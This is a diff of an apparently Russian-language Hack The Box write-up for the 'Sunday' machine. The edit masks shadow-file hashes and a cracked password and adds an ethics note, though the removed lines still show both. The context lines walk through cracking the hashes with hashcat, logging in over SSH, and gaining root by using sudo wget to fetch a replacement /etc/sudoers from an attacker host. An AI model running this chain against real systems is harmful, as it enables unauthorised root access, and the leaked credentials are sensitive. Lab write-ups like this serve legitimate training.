@@ -25,12 +25,12 @@ Foothold (SSH)
 
 Lateral Movement (Backup)
 ├── cd /backup → agent22.backup, shadow.backup
-├── sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB
-├── sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3
-└── hashcat -m 7400 → sammy:cooldude!
+├── sammy:<SHA256_HASH>
+├── sunny:<SHA256_HASH>
+└── hashcat -m 7400 → sammy:<PASSWORD>
 
 User Flag
-├── ssh -p 22022 sammy@sunday.htb (cooldude!)
+├── ssh -p 22022 sammy@sunday.htb (<PASSWORD>)
 └── cat user.txt → <USER_FLAG>
 
 Privilege Escalation (sudo wget)
@@ -42,6 +42,8 @@ Privilege Escalation (sudo wget)
 │   └── sudo wget -O /etc/sudoers http://10.10.14.160:8000/sudoers
 └── sudo su → root
 ```
+
+> Note: All flags, passwords, and hashes have been masked for ethical reasons.
 
 ---
 
@@ -121,23 +123,23 @@ cat shadow.backup
 ```
 
 ```
-sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
-sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+sammy:<SHA256_HASH>:6445::::::
+sunny:<SHA256_HASH>:17636::::::
 ```
 
 Формат `$5$` - SHA-256 crypt, hashcat mode **7400**.
 
 ```bash
-echo '$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB' > hashes.txt
+echo '<SHA256_HASH>' > hashes.txt
 hashcat -m 7400 hashes.txt /usr/share/wordlists/rockyou.txt
-# cooldude!
+# <PASSWORD>
 ```
 
 **Важный нюанс:** только хеш, без `username:`.
 
 ```bash
 ssh -p 22022 sammy@sunday.htb
-# Password: cooldude!
+# Password: <PASSWORD>
 cat user.txt
 # <USER_FLAG>
 ```
